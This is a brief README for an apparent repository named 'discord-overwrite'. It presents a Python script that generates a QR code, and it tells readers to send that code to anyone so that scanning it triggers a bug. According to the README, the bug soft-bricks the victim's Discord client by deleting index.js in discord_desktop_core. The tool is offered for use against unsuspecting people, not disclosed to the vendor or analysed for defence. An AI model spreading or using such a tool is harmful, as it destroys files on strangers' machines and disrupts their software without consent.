# discord-overwrite
Strange bug I found whilst testing some different aspects of discord. Enjoy :)


## How do I use it?

Run the .py file and send the QR code wherever you want, when they scan it this strange bug will trigger.

## What does it do?

If you refresh it basically soft-bricks your discord. You have to restart and install updates again. I seen it deletes index.js in discord_desktop_core
